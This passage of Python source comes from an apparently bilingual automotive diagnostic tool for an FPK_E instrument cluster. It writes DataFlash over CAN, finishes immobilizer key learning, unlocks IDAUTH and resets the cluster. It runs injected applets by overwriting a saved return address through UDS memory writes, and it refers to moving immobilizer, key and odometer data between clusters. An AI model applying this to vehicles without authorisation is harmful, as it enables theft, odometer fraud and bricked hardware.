        r_02fa = link.request_uds(b"\x22\x02\xfa", 0x62, timeout=2.0)
        if len(r_02fa) >= 8:
            key_crc_hex = r_02fa[4:8].hex().upper()

    poll = fpke_coil_poll_transponder(link, reporter=reporter)
    msg = tr(
        f"Обучение ключей завершено (режим 1, S0/S1 стёрты). Активных ключей: {poll['learned_keys']}.",
        f"Key learning completed (mode 1, S0/S1 erased). Active keys: {poll['learned_keys']}.",
    )
    reporter.success(msg)
    return {
        "ok": True,
        "summary": msg,
        "learned_keys": poll["learned_keys"],
        "remaining_keys": poll["remaining_keys"],
        "learned_key_ids": poll["learned_key_ids"],
        "key_list_crc32": key_crc_hex,
        "used_fallback_80_00": used_fallback_80_00,
        "promoted_mode2": promoted_mode2,
        "kessy_restored": kessy_restored,
        "poll": poll,
    }


# ────────────────────────────── DataFlash FACI Blank-Check & Writer ──────────────────────────────


def fpke_read_dflash_blank_checked(
    link: FpkeCanLink,
    *,
    offset: int = 0,
    length: int = FPKE_DFLASH_SIZE,
    cpu_dflash: bytes | None = None,
    attempts: int = 8,
    retry_delay: float = 0.15,
    reporter: OperationReporter = NULL_REPORTER,
) -> tuple[bytes, bytearray]:
    """Blank-check `[offset, offset + length)` of RV40F DataFlash via FACI `0x71` and return `(clean_slice, word_mask)`."""
    if offset < 0 or length <= 0 or offset + length > FPKE_DFLASH_SIZE or offset % 128 != 0 or length % 128 != 0:
        raise ValueError(f"Invalid DataFlash blank-check range: offset=0x{offset:X}, length=0x{length:X}")

    if cpu_dflash is not None and len(cpu_dflash) >= offset + length:
        raw_slice = bytes(cpu_dflash[offset : offset + length])
    else:
        raw_slice, _ = fpke_read_region_in_session(
            link,
            mode="direct",
            source=FPKE_DFLASH_ADDR + offset,
            length=length,
            use_stream=False,
            label="DataFlash (CPU)",
            reporter=reporter,
        )

    clean_buf = bytearray(raw_slice)
    word_mask = bytearray(length)
    prof = _refine_link_profile_from_stack(link)
    bc_payload = build_fpke_dflash_bc_applet(
        applet_entry=int(prof["applet_entry"]),
        caller_return=int(prof["caller_return"]),
        caller_r29=int(prof["caller_r29"]),
    )

    with _applet_ram_guard(link, bc_payload, param_size=8, save_result=True) as guard_state:
        prof = _resolve_link_profile(link)
        app_entry = int(prof["applet_entry"])
        src_param = int(prof["source_param"])
        res_addr = int(prof["result_addr"])
        saved_ret_addr = int(prof["saved_return"])
        rel = 0
        while rel < length:
            reporter.check_cancelled()
            step_bytes = min(512, length - rel)
            groups = step_bytes // 128
            cur_off = offset + rel
            raw_res = b""
            for attempt in range(1, max(1, attempts) + 1):
                fpke_write_memory_0x3d(link, src_param, struct.pack("<II", cur_off, groups))
                fpke_write_memory_0x3d(link, saved_ret_addr, app_entry.to_bytes(4, "little"))
                raw_res = fpke_read_memory_0x23(link, res_addr, FPKE_RESULT_SIZE)
                mark = raw_res[256:260]
                if mark == b"SCAN":
                    break
                if mark == b"BUSY" and attempt < attempts:
                    time.sleep(retry_delay)
                    continue
                raise RuntimeError(f"DataFlash blank-check applet marker mismatch at 0x{cur_off:04X}: {mark.hex()}")

            for grp in range(groups):
                bits = struct.unpack_from("<I", raw_res, grp * 4)[0]
                base_rel = rel + grp * 128
                for w_idx in range(32):
                    w_pos = base_rel + w_idx * 4
                    if (bits >> w_idx) & 1:
                        word_mask[w_pos : w_pos + 4] = b"\xff\xff\xff\xff"
                    else:
                        clean_buf[w_pos : w_pos + 4] = b"\xff\xff\xff\xff"
            rel += step_bytes
            reporter.progress(rel, length, unit="B", detail=f"BlankCheck @ 0x{offset + rel:04X}")

    if not guard_state.get("ram_restored"):
        raise RuntimeError("Failed to restore applet RAM after DataFlash blank-check")
    return bytes(clean_buf), word_mask


def _build_faci_block_jobs(
    live_clean_df: bytes,
    live_mask: bytes | bytearray,
    target_clean_df: bytes,
    target_mask: bytes | bytearray,
    *,
    vb_size: int = 0x800,
    pool_end: int = 28 * 0x800,
    only_offsets: set[int] | None = None,
) -> list[dict[str, Any]]:
    """Build power-fail-safe 64-byte FACI block jobs transforming `(live_clean_df, live_mask)` -> `(target_clean_df, target_mask)`."""
    raw_jobs: list[dict[str, Any]] = []
    for blk_off in range(0, FPKE_DFLASH_SIZE, 64):
        if only_offsets is not None and blk_off not in only_offsets:
            continue
        live_m16 = 0
        tgt_m16 = 0
        same_programmed = True
        subset_match = True
        for w in range(16):
            pos = blk_off + w * 4
            l_prog = any(live_mask[pos : pos + 4])
            t_prog = any(target_mask[pos : pos + 4])
            l_word = live_clean_df[pos : pos + 4]
            t_word = target_clean_df[pos : pos + 4]
            if l_prog:
                live_m16 |= 1 << w
            if t_prog:
                tgt_m16 |= 1 << w
            if l_prog != t_prog or (t_prog and l_word != t_word):
                same_programmed = False
            if l_prog and (not t_prog or l_word != t_word):
                subset_match = False

        if same_programmed:
            continue
        if subset_match:
            do_erase = False
            prog_mask = tgt_m16 & ~live_m16
        else:
            do_erase = True
            prog_mask = tgt_m16
        raw_jobs.append(
            {
                "blk_off": blk_off,
                "do_erase": do_erase,
                "prog_mask": prog_mask,
                "target_mask16": tgt_m16,
                "data": bytes(target_clean_df[blk_off : blk_off + 64]),
            }
        )

    def _sort_key(job: dict[str, Any]) -> tuple[int, int, int]:
        off = int(job["blk_off"])
        if off >= pool_end:
            return (1000, 0, off)
        vb_idx = off // vb_size
        in_vb = off % vb_size
        # Write record data blocks (high-to-low offset inside VB) BEFORE DRP/header blocks (low-to-high)
        is_hdr_or_drp = 1 if in_vb < 0x180 else 0
        order_in_vb = in_vb if is_hdr_or_drp else -in_vb
        return (vb_idx, is_hdr_or_drp, order_in_vb)

    raw_jobs.sort(key=_sort_key)
    return raw_jobs


def _refuse_slow_adapter_write(interface: str, blocks: int) -> None:
    """Refuse a DataFlash write of more than `FPKE_SLOW_ADAPTER_MAX_BLOCKS` blocks over a non-native adapter.

    Called before anything is written. A VAS 6154 sends one frame per 3-7 ms: a rewrite this large runs for minutes,
    and a VCI that drops mid-list leaves the cluster with part of the diff."""
    if interface in FPKE_NATIVE_INTERFACES or blocks <= FPKE_SLOW_ADAPTER_MAX_BLOCKS:
        return
    name_ru = "VAS 6154 / VNCI" if interface == "dpdu" else f"адаптер «{interface}»"
    name_en = "a VAS 6154 / VNCI" if interface == "dpdu" else f"adapter “{interface}”"
    raise RuntimeError(tr(
        f"Запись {blocks} блоков DataFlash через {name_ru} не начата: через этот адаптер разрешено не больше "
        f"{FPKE_SLOW_ADAPTER_MAX_BLOCKS} блоков за раз. Для большой перезаписи подключите CANable / candleLight "
        f"(через шлюз или напрямую к T18).",
        f"Writing {blocks} DataFlash blocks through {name_en} was not started: this adapter is limited to "
        f"{FPKE_SLOW_ADAPTER_MAX_BLOCKS} blocks per write. For a large rewrite connect a CANable / candleLight "
        f"(through the gateway or directly to T18).",
    ))


def fpke_write_dflash_blocks_in_session(
    link: FpkeCanLink,
    block_jobs: list[dict[str, Any]],
    *,
    attempts: int = 8,
    retry_delay: float = 0.15,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Execute 64-byte RV40F DataFlash block erase/program jobs in an open level-8 + IDAUTH-unlocked session."""
    if not block_jobs:
        return {
            "blocks_written": 0,
            "blocks_erased": 0,
            "words_programmed": 0,
            "busy_retries": 0,
            "ram_restored": True,
        }

    prof = _refine_link_profile_from_stack(link)
    wr_payload = build_fpke_dflash_write_applet(
        applet_entry=int(prof["applet_entry"]),
        caller_return=int(prof["caller_return"]),
    )
    erased_cnt = 0
    words_cnt = 0
    busy_retries = 0
    reporter.reset_stage_timer()
    reporter.progress(0, len(block_jobs), unit="blk", detail="FACI DataFlash Write")

    with _applet_ram_guard(link, wr_payload, param_size=72, save_result=True) as guard_state:
        prof = _resolve_link_profile(link)
        app_entry = int(prof["applet_entry"])
        src_param = int(prof["source_param"])
        res_addr = int(prof["result_addr"])
        saved_ret_addr = int(prof["saved_return"])
        for idx, job in enumerate(block_jobs):
            blk_off = int(job["blk_off"])
            do_erase = bool(job["do_erase"])
            prog_mask = int(job["prog_mask"]) & 0xFFFF
            blk_data = bytes(job["data"])
            if len(blk_data) != 64 or blk_off % 64 != 0 or not (0 <= blk_off <= FPKE_DFLASH_SIZE - 64):
                raise ValueError(f"Invalid DataFlash block job at 0x{blk_off:04X}")

            param = struct.pack("<HHI", blk_off, 1 if do_erase else 0, prog_mask << 16) + blk_data
            status = 0
            fstatr = 0
            for attempt in range(1, max(1, attempts) + 1):
                fpke_write_memory_0x3d(link, src_param, param)
                fpke_write_memory_0x3d(link, saved_ret_addr, app_entry.to_bytes(4, "little"))
                raw_res = fpke_read_memory_0x23(link, res_addr, FPKE_RESULT_SIZE)
                if raw_res[256:260] != b"SCAN":
                    raise RuntimeError(
                        f"DataFlash write applet marker mismatch at 0x{blk_off:04X}: {raw_res[256:260].hex()}"
                    )
                status, fstatr = struct.unpack_from("<II", raw_res, 0)
                if status == 1:
                    break
                if status == 6 and attempt < attempts:
                    busy_retries += 1
                    time.sleep(retry_delay)
                    continue
                err_lbl = {3: "ERSERR (erase failed)", 4: "PRGERR (program failed)", 6: "EEL_BUSY (FENTRYR != 0)"}.get(
                    status,
                    f"status={status}",
                )
                raise RuntimeError(
                    tr(
                        f"Ошибка записи DataFlash по смещению 0x{blk_off:04X}: {err_lbl} (FSTATR=0x{fstatr:08X}).",
                        f"DataFlash write error at offset 0x{blk_off:04X}: {err_lbl} (FSTATR=0x{fstatr:08X}).",
                    )
                )

            if do_erase:
                erased_cnt += 1
            words_cnt += bin(prog_mask).count("1")
            reporter.progress(idx + 1, len(block_jobs), unit="blk", detail=f"0xFF20{blk_off:04X}")

    if not guard_state.get("ram_restored"):
        raise RuntimeError("Failed to restore applet RAM after DataFlash write")
    return {
        "blocks_written": len(block_jobs),
        "blocks_erased": erased_cnt,
        "words_programmed": words_cnt,
        "busy_retries": busy_retries,
        "payload_sha256": hashlib.sha256(wr_payload).hexdigest(),
        "ram_restored": True,
    }


def fpke_trigger_swresa_reset(
    link: FpkeCanLink,
    *,
    wake_seconds: float = 1.2,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Trigger immediate hardware `SWRESA` reset (`0xFFF80A04`) so `R_EEL_Startup` + `NvM_ReadAll` reloads DataFlash without `NvM_WriteAll`."""
    prof = _refine_link_profile_from_stack(link)
    app_entry = int(prof["applet_entry"])
    saved_ret_addr = int(prof["saved_return"])
    exp_caller_ret = int(prof["caller_return"]).to_bytes(4, "little")
    cur_saved_ret = fpke_read_memory_0x23(link, saved_ret_addr, 4)
    if cur_saved_ret != exp_caller_ret:
        raise RuntimeError(
            f"Unexpected saved return at 0x{saved_ret_addr:08X} before SWRESA reset: "
            f"{cur_saved_ret.hex()} (expected {exp_caller_ret.hex()})"
        )
    rst_payload = build_fpke_swresa_reset_applet()
    fpke_write_memory_0x3d(link, app_entry, rst_payload)
    trigger_req = (
        b"\x3d\x44"
        + saved_ret_addr.to_bytes(4, "big")
        + (4).to_bytes(4, "big")
        + app_entry.to_bytes(4, "little")
    )
    with contextlib.suppress(Exception):
        link.send_uds(trigger_req)
        link.receive_uds(timeout=0.25)
    link.level8_active = False
    link._stack_profile_verified = False

    if wake_seconds > 0:
        time.sleep(min(1.5, max(0.05, wake_seconds * 0.35)))
    link.start_keepalive()
    if wake_seconds > 0:
        time.sleep(min(0.8, max(0.02, wake_seconds * 0.2)))

    live_ident: list[dict[str, str]] = []
    with contextlib.suppress(Exception):
        link.request_uds(b"\x10\x01", 0x50, timeout=1.5)
        for did, ru_l, en_l, is_hex in (
            (0xF187, "Номер детали", "Part number", False),
            (0xF190, "VIN", "VIN", False),
            (0x0600, "Кодирование", "Coding", True),
        ):
            with contextlib.suppress(Exception):
                resp = link.request_uds(struct.pack(">BH", 0x22, did), 0x62, timeout=1.2)
                raw_v = resp[3:]
                val = raw_v.hex().upper() if is_hex else raw_v.decode("latin1", errors="replace").strip("\x00 ")
                live_ident.append({"did": f"{did:04X}", "label_ru": ru_l, "label_en": en_l, "value": val})
    reporter.info(
        tr(
            "Аппаратный перезапуск приборной панели (SWRESA) выполнен — обновлённые данные загружены в ОЗУ.",
            "Hardware cluster reset (SWRESA) completed — updated DataFlash records loaded into RAM.",
        )
    )
    return {
        "method": "swresa_0xfff80a04",
        "payload_sha256": hashlib.sha256(rst_payload).hexdigest(),
        "ident_after": live_ident,
    }


def can_fpke_write_dflash(
    port: str,
    candidate_dflash: bytes | Path,
    *,
    interface: str = "slcan",
    base_dflash: bytes | Path | None = None,
    cflash_bytes: bytes | None = None,
    session_dir: Path | None = None,
    frame_delay: float = FPKE_DEFAULT_FRAME_DELAY,
    wake_seconds: float = 4.0,
    full_rewrite: bool = False,
    allow_foreign: bool = False,
    reset_after: bool = True,
    keep_open: bool = True,
    via_gateway: bool = False,
    gateway_bridge: bool = False,
    gateway_channel: int = 0,
    bus: Any | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Write modified FPK_E DataFlash changes or a full 64 KiB DataFlash backup over CAN with hardware Blank-Check & readback verification.

    Workflow:
      1. Establishes or reuses vendor level 8 (`0xFEDF3113 = 8`).
      2. Reads Extra Area (`0xFF300000`), unlocks hardware `IDAUTH` (`IDST == 0`), and saves a live 64 KiB `Dflash_before.bin` backup.
      3. Refuses foreign-cluster dumps (`FD11` identity mismatch) unless `allow_foreign=True`.
      4. In smart EEL mode (`base_dflash` provided and `not full_rewrite`), extracts semantic EEL updates, blank-checks
         `VB_head` & `VB_next` on live hardware, and appends records into blank cells with **zero flash erases** (`do_erase=0`).
         In `full_rewrite` / backup restore mode, blank-checks all 64 KiB and writes changed 64B blocks.
      5. Verifies every written block via hardware Blank-Check readback (`BCST` + bytes) and full 64 KiB `Dflash_readback.bin`.
      6. Relocks `IDAUTH` and triggers immediate `SWRESA` hardware reset so `NvM_ReadAll` loads the new records without
         `NvM_WriteAll` overwriting them from stale RAM.
    """
    from contitool.can.workflows import default_session_dir

    verify_fpke_self_tests()
    cand_bytes = Path(candidate_dflash).read_bytes() if isinstance(candidate_dflash, (str, Path)) else bytes(candidate_dflash)
    if len(cand_bytes) != FPKE_DFLASH_SIZE or not is_fpke_dflash(cand_bytes):
        raise ValueError(
            tr(
                f"Некорректный образ DataFlash FPK_E ({len(cand_bytes)} Б): требуется валидный дамп 65 536 байт с пулом EEL T01.",
                f"Invalid FPK_E DataFlash image ({len(cand_bytes)} B): expected a valid 65,536-byte EEL T01 dump.",
            )
        )
    base_bytes = (
        Path(base_dflash).read_bytes()
        if isinstance(base_dflash, (str, Path))
        else (bytes(base_dflash) if base_dflash is not None else None)
    )

    out_dir = session_dir or default_session_dir(None, "fpke_write")
    out_dir.mkdir(parents=True, exist_ok=True)
    before_path = out_dir / "Dflash_before.bin"
    readback_path = out_dir / "Dflash_readback.bin"
    dflash_path = out_dir / "Dflash.bin"
    extra_path = out_dir / "ExtraArea.bin"
    report_path = out_dir / "fpke_write_report.json"
    can_log_path = out_dir / "fpke.can.log"

    total_steps = 6 if reset_after else 5
    started = time.monotonic()

    with _managed_fpke_session(
        port,
        interface=interface,
        log_path=out_dir / "can.jsonl",
        bus=bus,
        keep_open=keep_open and not via_gateway,
        via_gateway=via_gateway,
        gateway_bridge=gateway_bridge,
        gateway_channel=gateway_channel,
        needs_level8=True,
        reporter=reporter,
    ) as (link, bridged):
        eff_wake = min(wake_seconds, 1.5) if bridged else wake_seconds
        idauth_unlocked = False
        try:
            # Step 1: Level 8 access
            reporter.step(1, total_steps, tr("Проверка доступа уровня 8 по CAN", "Checking level 8 CAN access"))
            access_info = fpke_ensure_level8(
                link,
                frame_delay=frame_delay,
                wake_seconds=eff_wake,
                reporter=reporter,
            )

            # Step 2: Extra Area + IDAUTH unlock + live Dflash_before.bin backup
            reporter.step(
                2,
                total_steps,
                tr(
                    "Разблокировка IDAUTH и резервное чтение текущего DataFlash (64 КБ)",
                    "Unlocking IDAUTH & backing up live DataFlash (64 KB)",
                ),
            )
            extra_bytes, extra_meta = _read_verified_extra_area(link, label="Extra Area", reporter=reporter)
            atomic_write(extra_path, extra_bytes)
            extra_info = analyze_fpke_extra_area(extra_bytes)
            candidate_idcode = bytes(extra_bytes[0x50:0x60])

            idst_before = fpke_read_memory_0x23(link, IDST_ADDR, 4)
            idst_after = fpke_idauth(link, candidate_idcode)
            if idst_after != b"\x00\x00\x00\x00":
                raise RuntimeError(
                    tr(
                        f"Аппаратный IDAUTH отклонил IDCODE приборной панели (IDST={idst_after.hex()}). Запись отменена.",
                        f"Hardware IDAUTH rejected cluster IDCODE (IDST={idst_after.hex()}). Write aborted.",
                    )
                )
            idauth_unlocked = True

            dflash_before, before_meta = _read_verified_dflash(
                link,
                use_stream=False,
                label="DataFlash (backup)",
                reporter=reporter,
            )
            atomic_write(before_path, dflash_before)
            before_info = analyze_fpke_dflash(dflash_before, cflash_bytes)
            cand_info = analyze_fpke_dflash(cand_bytes, cflash_bytes)

            # Foreign cluster safety check (FD11 identifier & vendor keys in EEL 0x63)
            live_fd11 = before_info.get("fd11_identifier")
            cand_fd11 = cand_info.get("fd11_identifier")
            if live_fd11 and cand_fd11 and live_fd11 != cand_fd11 and not allow_foreign:
                raise RuntimeError(
                    tr(
                        f"Отказано в прямой записи чужого дампа DataFlash: идентификатор FD11 в дампе ({cand_fd11}) "
                        f"не совпадает с подключённой приборной панелью ({live_fd11}). "
                        "Для переноса иммо, ключей, пробега и CP используйте вкладку «Перенос из донора».",
                        f"Refusing to write a foreign cluster DataFlash dump directly: candidate FD11 ({cand_fd11}) "
                        f"does not match connected cluster ({live_fd11}). "
                        "Use the “Donor transfer” tab to transfer immo, keys, odometer, and CP safely.",
                    )
                )

            # Step 3: Hardware Blank-Check & differential block job calculation
            reporter.step(
                3,
                total_steps,
                tr(
                    "Аппаратный Blank-Check и расчёт изменяемых блоков DataFlash",
                    "Hardware Blank-Check & calculating DataFlash block updates",
                ),
            )
            lay = fpke_eel_layout(cflash_bytes, dflash_before)
            vb_sz = lay["vb"]
            n_vb = lay["n_vb"]
            pool_end = lay["base"] + n_vb * vb_sz

            ref_base = base_bytes if base_bytes is not None else dflash_before
            change_summary = summarize_fpke_dflash_changes(ref_base, cand_bytes, cflash_bytes)
            eel_updates = extract_fpke_eel_updates(ref_base, cand_bytes, cflash_bytes)
            ref_clean_df, ref_mask = normalize_fpke_dflash_for_faci(ref_base, cflash_bytes)
            cand_clean_df, cand_mask = normalize_fpke_dflash_for_faci(cand_bytes, cflash_bytes)
            has_eel_append = (
                (not full_rewrite)
                and bool(eel_updates)
                and bool(change_summary.get("eel_pool_append_only") or change_summary.get("is_pure_eel_update"))
            )
            eel_pool_unchanged = (
                (not full_rewrite)
                and (not eel_updates)
                and ref_clean_df[:pool_end] == cand_clean_df[:pool_end]
                and ref_mask[:pool_end] == cand_mask[:pool_end]
            )
            tail_diff_128_offsets = [
                off
                for off in range(pool_end, FPKE_DFLASH_SIZE, 128)
                if ref_clean_df[off : off + 128] != cand_clean_df[off : off + 128]
                or ref_mask[off : off + 128] != cand_mask[off : off + 128]
            ]
            use_smart_eel = has_eel_append and not tail_diff_128_offsets
            use_smart_tail = eel_pool_unchanged and bool(tail_diff_128_offsets)
            use_smart_both = has_eel_append and bool(tail_diff_128_offsets)

            if use_smart_eel or use_smart_tail or use_smart_both:
                if use_smart_both:
                    write_mode = "smart_eel_and_tail"
                elif use_smart_eel:
                    write_mode = "smart_eel_append"
                else:
                    write_mode = "smart_tail_update"

                live_clean_df, live_mask = normalize_fpke_dflash_for_faci(dflash_before, cflash_bytes)
                live_clean_mut = bytearray(live_clean_df)
                live_mask_mut = bytearray(live_mask)
                scanned_eel_offsets: set[int] = set()
                scanned_tail_offsets: set[int] = set()

                if use_smart_eel or use_smart_both:
                    blocks_live, _ = eel_parse_pool(lay, live_clean_df, live_mask)
                    active_nums = {b["vb"] for b in blocks_live if b["state"] == "active"}
                    ring_start = 0
                    if 0 in active_nums and (n_vb - 1) in active_nums and len(active_nums) < n_vb:
                        ring_start = n_vb - 1
                        while ((ring_start - 1) % n_vb) in active_nums:
                            ring_start = (ring_start - 1) % n_vb
                    active_sorted = sorted(
                        (b for b in blocks_live if b["state"] == "active"),
                        key=lambda blk: (blk["ec"] or 0, (blk["vb"] - ring_start) % n_vb),
                    )
                    if not active_sorted:
                        raise RuntimeError("No active EEL virtual blocks found in live DataFlash pool")
                    head_vb = active_sorted[-1]["vb"]
                    scan_vbs = [head_vb, (head_vb + 1) % n_vb, (head_vb + 2) % n_vb]
                    for v_idx in scan_vbs:
                        vb_off = lay["base"] + v_idx * vb_sz
                        bc_slice, bc_mask = fpke_read_dflash_blank_checked(
                            link,
                            offset=vb_off,
                            length=vb_sz,
                            cpu_dflash=dflash_before,
                            reporter=reporter,
                        )
                        live_clean_mut[vb_off : vb_off + vb_sz] = bc_slice
                        live_mask_mut[vb_off : vb_off + vb_sz] = bc_mask
                        for bo in range(vb_off, vb_off + vb_sz, 64):
                            scanned_eel_offsets.add(bo)

                if use_smart_tail or use_smart_both:
                    for t_off in tail_diff_128_offsets:
                        bc_slice, bc_mask = fpke_read_dflash_blank_checked(
                            link,
                            offset=t_off,
                            length=128,
                            cpu_dflash=dflash_before,
                            reporter=reporter,
                        )
                        live_clean_mut[t_off : t_off + 128] = bc_slice
                        live_mask_mut[t_off : t_off + 128] = bc_mask
                        scanned_tail_offsets.add(t_off)
                        scanned_tail_offsets.add(t_off + 64)

                live_clean_df = bytes(live_clean_mut)
                live_mask = live_mask_mut
                target_clean_mut = bytearray(live_clean_df)
                target_mask_mut = bytearray(live_mask)

                if use_smart_eel or use_smart_both:
                    synth_before_mask = eel_faci_word_mask(lay, live_clean_df)
                    appended_df = eel_append_records(live_clean_df, eel_updates, cflash_bytes)
                    eel_target_clean, eel_target_mask = normalize_fpke_dflash_for_faci(appended_df, cflash_bytes)
                    blocks_after, _ = eel_parse_pool(lay, eel_target_clean, eel_target_mask)
                    newly_activated_vbs = {
                        v_idx
                        for v_idx in range(n_vb)
                        if blocks_live[v_idx]["state"] != "active" and blocks_after[v_idx]["state"] == "active"
                    }
                    # Check if rollover touched any VB outside `scan_vbs` and blank-check it as well
                    for v_idx in range(n_vb):
                        vb_off = lay["base"] + v_idx * vb_sz
                        if vb_off in scanned_eel_offsets:
                            continue
                        if (
                            v_idx in newly_activated_vbs
                            or eel_target_clean[vb_off : vb_off + vb_sz] != live_clean_df[vb_off : vb_off + vb_sz]
                            or eel_target_mask[vb_off : vb_off + vb_sz] != synth_before_mask[vb_off : vb_off + vb_sz]
                        ):
                            bc_slice, bc_mask = fpke_read_dflash_blank_checked(
                                link,
                                offset=vb_off,
                                length=vb_sz,
                                cpu_dflash=dflash_before,
                                reporter=reporter,
                            )
                            live_clean_mut[vb_off : vb_off + vb_sz] = bc_slice
                            live_mask_mut[vb_off : vb_off + vb_sz] = bc_mask
                            target_clean_mut[vb_off : vb_off + vb_sz] = bc_slice
                            target_mask_mut[vb_off : vb_off + vb_sz] = bc_mask
                            for bo in range(vb_off, vb_off + vb_sz, 64):
                                scanned_eel_offsets.add(bo)
                    live_clean_df = bytes(live_clean_mut)
                    live_mask = live_mask_mut
                    # Apply all newly added, newly erased (invalid VB rollover), or modified EEL words while
                    # preserving exact hardware BCST on untouched words inside already-active VBs.
                    for bo in scanned_eel_offsets:
                        v_idx = (bo - lay["base"]) // vb_sz
                        in_new_vb = v_idx in newly_activated_vbs
                        for w in range(16):
                            pos = bo + w * 4
                            before_prog = any(synth_before_mask[pos : pos + 4])
                            after_prog = any(eel_target_mask[pos : pos + 4])
                            word_changed = in_new_vb or (before_prog != after_prog) or (
                                after_prog and eel_target_clean[pos : pos + 4] != live_clean_df[pos : pos + 4]
                            )
                            if word_changed:
                                target_mask_mut[pos : pos + 4] = eel_target_mask[pos : pos + 4]
                                target_clean_mut[pos : pos + 4] = eel_target_clean[pos : pos + 4]

                if use_smart_tail or use_smart_both:
                    # Treat .FBL_RSAKEY (0xED00..0xED7F) as an atomic 128-byte logical field if any byte in it changed,
                    # while preserving exact hardware BCST on untouched words elsewhere in scanned tail slices so
                    # CPU-read floating-gate noise in erased cells is never programmed.
                    rsa_off = FPKE_DFLASH_FBL_RSAKEY_OFFSET
                    rsa_end = rsa_off + FPKE_DFLASH_FBL_RSAKEY_SIZE
                    rsa_changed = (
                        ref_clean_df[rsa_off:rsa_end] != cand_clean_df[rsa_off:rsa_end]
                        or ref_mask[rsa_off:rsa_end] != cand_mask[rsa_off:rsa_end]
                    )
                    for t_off in tail_diff_128_offsets:
                        for pos in range(t_off, t_off + 128, 4):
                            in_changed_rsa = rsa_changed and (rsa_off <= pos < rsa_end)
                            word_changed = (
                                ref_clean_df[pos : pos + 4] != cand_clean_df[pos : pos + 4]
                                or ref_mask[pos : pos + 4] != cand_mask[pos : pos + 4]
                            )
                            if in_changed_rsa or word_changed:
                                target_clean_mut[pos : pos + 4] = cand_clean_df[pos : pos + 4]
                                target_mask_mut[pos : pos + 4] = cand_mask[pos : pos + 4]

                target_clean_df = bytes(target_clean_mut)
                target_mask = target_mask_mut
                scanned_blk_offsets = scanned_eel_offsets | scanned_tail_offsets
                block_jobs = _build_faci_block_jobs(
                    live_clean_df,
                    live_mask,
                    target_clean_df,
                    target_mask,
                    vb_size=vb_sz,
                    pool_end=pool_end,
                    only_offsets=scanned_blk_offsets,
                )
            else:
                write_mode = "full_blank_checked_diff"
                target_clean_df, target_mask = normalize_fpke_dflash_for_faci(cand_bytes, cflash_bytes)
                # The CPU-read backup already tells how many blocks change: refuse before the 64 KB blank-check
                est_clean_df, est_mask = normalize_fpke_dflash_for_faci(dflash_before, cflash_bytes)
                _refuse_slow_adapter_write(link.interface, len(_build_faci_block_jobs(
                    est_clean_df, est_mask, target_clean_df, target_mask, vb_size=vb_sz, pool_end=pool_end
                )))
                live_clean_df, live_mask = fpke_read_dflash_blank_checked(
                    link,
                    offset=0,
                    length=FPKE_DFLASH_SIZE,
                    cpu_dflash=dflash_before,
                    reporter=reporter,
                )
                block_jobs = _build_faci_block_jobs(
                    live_clean_df,
                    live_mask,
                    target_clean_df,
                    target_mask,
                    vb_size=vb_sz,
                    pool_end=pool_end,
                )

            _refuse_slow_adapter_write(link.interface, len(block_jobs))

            # Step 4: Uninterruptible FACI Erase/Program
            reporter.step(
                4,
                total_steps,
                tr(
                    f"Запись в DataFlash ({len(block_jobs)} бл. по 64 Б)",
                    f"Writing to DataFlash ({len(block_jobs)} × 64 B blocks)",
                ),
            )
            if block_jobs:
                reporter.info(
                    tr(
                        "Идёт аппаратная запись DataFlash (RV40F FACI) — НЕ отключайте питание приборной панели!",
                        "Hardware DataFlash write (RV40F FACI) in progress — DO NOT disconnect cluster power!",
                    )
                )
                with reporter.uninterruptible():
                    write_stats = fpke_write_dflash_blocks_in_session(link, block_jobs, reporter=reporter)
            else:
                write_stats = {
                    "blocks_written": 0,
                    "blocks_erased": 0,
                    "words_programmed": 0,
                    "busy_retries": 0,
                    "ram_restored": True,
                }
                reporter.info(
                    tr(
                        "Все целевые данные уже записаны в DataFlash приборной панели (0 изменённых блоков).",
                        "All target data is already present in cluster DataFlash (0 blocks changed).",
                    )
                )

            # Step 5: Hardware Blank-Check & Full 64 KB Readback Verification
            reporter.step(
                5,
                total_steps,
                tr(
                    "Контрольное чтение и побайтовая верификация DataFlash",
                    "Readback & byte-for-byte DataFlash verification",
                ),
            )
            verified_pages: set[int] = {int(j["blk_off"]) & ~0x7F for j in block_jobs}
            for page_off in sorted(verified_pages):
                rb_slice, rb_mask = fpke_read_dflash_blank_checked(
                    link,
                    offset=page_off,
                    length=128,
                    cpu_dflash=None,
                    reporter=reporter,
                )
                for j in block_jobs:
                    bo = int(j["blk_off"])
                    if not (page_off <= bo < page_off + 128):
                        continue
                    rel_bo = bo - page_off
                    got_64 = rb_slice[rel_bo : rel_bo + 64]
                    exp_64 = bytes(j["data"])
                    got_m16 = sum((1 << w) for w in range(16) if any(rb_mask[rel_bo + w * 4 : rel_bo + w * 4 + 4]))
                    exp_m16 = int(j["target_mask16"])
                    if got_64 != exp_64 or got_m16 != exp_m16:
                        raise RuntimeError(
                            tr(
                                f"Ошибка верификации блока DataFlash 0x{bo:04X}: BCST=0x{got_m16:04X} (ожидался 0x{exp_m16:04X}).",
                                f"DataFlash block verification failed at 0x{bo:04X}: BCST=0x{got_m16:04X} (expected 0x{exp_m16:04X}).",
                            )
                        )

            dflash_readback, readback_meta = _read_verified_dflash(
                link,
                use_stream=False,
                label="DataFlash (verify)",
                reporter=reporter,
            )
            atomic_write(readback_path, dflash_readback)
            atomic_write(dflash_path, dflash_readback)

            # Verify every updated EEL record in the full 64 KB readback image
            lay_rb = fpke_eel_layout(cflash_bytes, dflash_readback)
            for ident, expected_rec in eel_updates.items():
                got_rec, got_src = eel_read_record_any(lay_rb, dflash_readback, ident)
                if got_src.get("generation") != "current" or got_rec != expected_rec:
                    raise RuntimeError(
                        tr(
                            f"Контрольная проверка записи EEL 0x{ident:02X} после чтения DataFlash не пройдена!",
                            f"Post-write verification failed for EEL record 0x{ident:02X} in DataFlash readback!",
                        )
                    )

            idst_relock = fpke_idauth(link, b"\x00" * 16)
            idauth_unlocked = False

            # Step 6: Immediate SWRESA hardware reset so R_EEL_Startup + NvM_ReadAll loads new records into RAM
            reset_info: dict[str, Any] | None = None
            if reset_after and block_jobs:
                reporter.step(
                    6,
                    total_steps,
                    tr(
                        "Аппаратный перезапуск панели приборов (SWRESA) и проверка данных в ОЗУ",
                        "Hardware cluster reset (SWRESA) & live RAM verification",
                    ),
                )
                reset_info = fpke_trigger_swresa_reset(link, wake_seconds=eff_wake, reporter=reporter)

            prof = _resolve_link_profile(link)
